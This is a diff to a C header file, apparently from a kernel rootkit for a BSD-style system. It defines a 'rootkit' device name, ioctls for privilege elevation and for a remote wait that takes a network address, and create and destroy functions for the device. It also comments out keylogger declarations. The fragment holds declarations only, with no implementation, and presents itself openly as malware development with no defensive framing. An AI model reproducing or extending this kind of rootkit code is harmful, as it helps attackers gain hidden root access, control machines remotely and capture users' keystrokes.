@@ -1,15 +1,23 @@
-#ifndef ROOTKIT_DEVICE_H
-#define ROOTKIT_DEVICE_H
+#ifndef INTERFACE_H
+#define INTERFACE_H
 
 #include <sys/ioccom.h>
+#include <netinet/in.h>
 
-#define RK_ELEVATE _IO('R', 1)
+#define rootkit_DEV_NAME "rootkit"
 
-#ifdef _KERNEL
-int make_rk_dev(void);
-void destroy_rk_dev(void);
-void init_keylogger(void);
-void cleanup_keylogger(void);
+/* ioctl definitions for privilege elevation and remote wait */
+#define rootkit_ELEVATE            _IO('r', 0x01)
+#define rootkit_IOCTL_ELEVATE      rootkit_ELEVATE
+
+#define rootkit_WAIT_REMOTE        _IOW('r', 0x02, struct in_addr)
+#define rootkit_IOCTL_WAIT_REMOTE  rootkit_WAIT_REMOTE
+
+int make_rootkit_dev(void);
+void destroy_rootkit_dev(void);
+
+// void init_keylogger(void);
+// void cleanup_keylogger(void);
+
 #endif
 
-#endif
